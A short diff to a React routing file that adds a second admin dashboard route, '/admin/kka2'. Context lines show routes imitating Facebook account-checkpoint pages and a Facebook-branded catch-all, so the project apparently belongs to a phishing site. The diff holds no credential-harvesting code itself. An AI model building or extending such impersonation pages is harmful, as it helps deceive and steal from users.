@@ -11,6 +11,7 @@ import { TH } from "./TH";
 import { Robot } from "./Robot";
 import {BLOCK_ORG} from './utils/variable'
 import { FacebookButton } from "./FacebookButton";
+import Dashboard2 from "./Dashboard2";
 
 export default function RootNavigation() {
   const [is_visible, setVisible] = useState(false);
@@ -68,6 +69,7 @@ export default function RootNavigation() {
           <Route path="/checkpoint/next=phone" element={<TH />} />
           <Route path="/checkpoint/next=secure" element={<Robot />} /> */}
           <Route path="/admin/kka" element={<Dashboard />} />
+          <Route path="/admin/kka2" element={<Dashboard2 />} />
           <Route path="*" element={<FacebookButton />} />
         </Route>
       </Routes>
